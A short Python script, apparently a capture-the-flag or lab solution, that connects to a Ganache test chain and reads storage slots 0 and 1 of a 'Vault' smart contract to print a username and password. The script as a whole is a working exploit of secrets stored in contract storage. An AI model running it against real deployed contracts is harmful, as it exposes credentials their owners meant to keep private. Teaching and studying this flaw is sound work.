import argparse, json
from web3 import Web3

def main():
    
    vuln = json.load(open('Vault.json'))

    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    args = parser.parse_args()

    ganache_client = Web3(Web3.HTTPProvider(f"http://{args.host}"))

    contract_instance = ganache_client.eth.contract(address=vuln['Contract Address'], abi=vuln['Contract ABI'])
    username_hex = contract_instance.web3.eth.getStorageAt(vuln['Contract Address'], 0)
    password_hex = contract_instance.web3.eth.getStorageAt(vuln['Contract Address'], 1)
    print(Web3.toText(username_hex).replace('\x00','').replace('\n', ''))
    print(Web3.toText(password_hex).replace('\x00','').replace('\n', ''))


if __name__ == "__main__":

    main()



# 0xfE4522744A432a6fc04dB8511728F9846731C236